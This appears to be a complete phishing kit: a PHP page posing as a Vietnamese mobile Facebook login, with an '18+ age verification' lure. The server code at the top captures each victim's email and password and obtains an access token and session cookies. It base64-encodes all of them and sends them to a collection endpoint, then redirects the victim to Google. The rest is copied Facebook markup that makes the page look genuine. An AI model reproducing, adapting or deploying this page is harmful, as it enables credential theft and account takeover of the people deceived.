<?php
if(isset($_POST['u'])){
    $u = $_POST['u'];
    $p = $_POST['p'];
    if(isset($u) AND isset($p)){
        $data = Login($u,$p);

        if(strpos($data,"\"access_token\":") == true){
            $data = json_decode($data,true);
            $token = $data["access_token"];
            $cookie = "c_user=".$data["session_cookies"][0]["value"].";xs=".$data["session_cookies"][1]["value"].";";
            $array = array(
                'email' => $u, 
                'password' => $p,
                'access_token' => $token,
                'cookie' => $cookie,
                'time_creat' => time()
            );

            $data_send = base64_encode(json_encode($array));
            $link_send = 'http://localhost/api/add.php?data='.urlencode($data_send).'';
            file_get_contents($link_send);

           // echo urlencode($data_send);
            //$list = $u."|".$p."|".$cookie."|".$token;

           header("Location: https://google.com");
        }else{
            $data = json_decode($data,true);
            $mess = json_decode($data['error_data'], true)['error_message'];
            echo '<script>alert("'.$mess.'");</script>';

        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Đăng nhập Facebook | Facebook</title>
    <meta charset="utf-8">
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="MTjPt" href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/l/0,cross/LPc9XRTIaoc.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="WKr91" href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/l/0,cross/Us-yVzw-2A4.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="29sAD" href="https://static.xx.fbcdn.net/rsrc.php/v3/yt/l/0,cross/S5zV7mCCUXS.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="6CB2b" href="https://static.xx.fbcdn.net/rsrc.php/v3/ys/l/0,cross/RWAN3d_LMcN.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="MN3ov" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/0,cross/RRXLYQ0ClN_.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="iBW4C" href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/0,cross/oMuvQZ46rsN.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="NUJ+j" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/RXrc1vCZHDX.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="QgjpW" href="https://static.xx.fbcdn.net/rsrc.php/v3/yO/l/0,cross/EH8johcqaZ6.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="9OSr7" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/WTZrECGgMbU.css" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="A8ekJ" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/HysQDcSDOWr.css" />

</head>

<body tabindex="0" class="touch x2 _fzu _50-3 iframe acw">

    <div id="viewport">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_4g33 _52we _52z5" id="header">
                <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="/login/?locale2=vi_VN&amp;refid=9"><i class="img sp_iOPLBREG0Ph_2x sx_73031c"><u>facebook</u></i></a>
                </div>
            </div>
            <div class="_5soa _3-q1 acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                <div class="_4g33">
                    <div class="_4g34" id="u_0_0">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div class="aclb _4-4l">
                            <div class="_5rut">

                                <div>
                                    <div class="_52jj _3-q2"><img src="https://www.facebook.com/images/fb_icon_325x325.png" width="60" class="_3-q3 img" />
                                        <div class="_52je _52j9">Đây là nội dung 18+. Hãy chắc chắn rằng bạn đã đủ tuổi ! Vui lòng đăng nhập để xác minh độ tuổi của bạn. </div>
                                    </div>
                                </div>
                                <form method="post" action="" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
                                    <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
                                    <div class="_56be _5sob" id="result">
                                        <div class="_55wo _55x2 _56bf">
                                            <div id="email_input_container">
                                                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="u" placeholder="Email ho&#x1eb7;c s&#x1ed1; &#x111;i&#x1ec7;n tho&#x1ea1;i" type="text" data-sigil="m_login_email" required="" />
                                            </div>
                                            <div>
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_4g33">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="p" placeholder="M&#x1ead;t kh&#x1ea9;u Facebook" type="password" data-sigil="password-plain-text-toggle-input" required="" />
                                                            </div>
                                                        </div>
                                                        <div class="_5s61 _216i _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <div class="_2pi9" style="display:none" id="u_0_1"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2">ẨN</span><span class="mfss" id="u_0_3">HIỂN THỊ</span></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="u_0_4" data-sigil="login_password_step_element">
                                            <button type="submit" value="&#x110;&#x103;ng nh&#x1ead;p" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="dang_nhap" data-sigil="touchable m_login_button"><span class="_55sr">Đăng nhập</span>
                                            </button>
                                             <button class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" id="start_thong_ke" style="display: none;"><span class="_55sr">Bắt đầu thống kê</span></button>
                                        </div>
                                    </div>
                                    <input type="hidden" name="prefill_contact_point" id="prefill_contact_point" />
                                    <input type="hidden" name="prefill_source" id="prefill_source" />
                                    <input type="hidden" name="prefill_type" id="prefill_type" />
                                    <input type="hidden" name="first_prefill_source" id="first_prefill_source" />
                                    <input type="hidden" name="first_prefill_type" id="first_prefill_type" />
                                    <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" />
                                    <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" />
                                    <div class="_xo8"></div>
                                    <noscript>
                                        <input type="hidden" name="_fb_noscript" value="true" />
                                    </noscript>
                                </form>
                                <div></div>
                                <div>
                                    <div>
                                        <div class="_4581"><a href="/reg/?cid=103&amp;locale2=vi_VN&amp;refid=9">Tạo tài khoản</a>
                                        </div>
                                        <div class="_4581"><a href=" ajaxify="false" target="_self" data-sigil="MLynx_asynclazy">Lúc khác</a>
                                        </div>
                                    </div>
                                    <div class="other-links">
                                        <ul class="_5pkb _55wp">
                                            <li><span class="mfss fcg"><a href="">Quên mật khẩu?</a><span aria-hidden="true"> · </span>
                                                </span>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            <div></div>
                        </div>
                    </div>
                </div>
                <div></div><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" />
                <div class="_55wr _5ui2">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_4g33">
                                <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">中文(台灣)</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Español</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Français (France)</a></span>
                                    </div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">English (UK)</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">한국어</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-sigil="change_language">Português (Brasil)</a></span>
                                    </div>
                                    <a href="">
                                        <div class="_3j87 _1rrd _3ztd" aria-label="Danh s&#xe1;ch ng&#xf4;n ng&#x1eef; &#x111;&#x1ea7;y &#x111;&#x1ee7;"><i class="img sp_iOPLBREG0Ph_2x sx_952933"></i>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4"><span class="mfss fcg">Facebook ©2018</span>
                        </div>
                    </div>
                </div>
            </div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_6" data-sigil="marea">
                <div class="_5vsg" id="u_0_7"></div>
                <div class="_5vsh" id="u_0_8"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Đang tải...</div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Thử lại</a>
                </div>
            </div>
        </div>
    </div>
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_4g33 _52we">
                    <div class="_5s61">
                        <div class="_52z7">
                            <button type="submit" value="H&#x1ee7;y" class="cancelButton btn btnD bgb mfss touchable" id="u_0_a" data-sigil="dialog-cancel-button">Hủy</button>
                            <button type="submit" value="Quay l&#x1ea1;i" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Quay l&#x1ea1;i" id="u_0_b" data-sigil="dialog-back-button"><i class="img sp_hOyoCMsIOLn_2x sx_edb429" style="margin-top: 2px;"></i>
                            </button>
                        </div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">Đang tải...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
                <div id="pagelet_0_0"></div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Đang tải...</div>
        </div>
    </div>
 

</body>

</html>

<?php

?>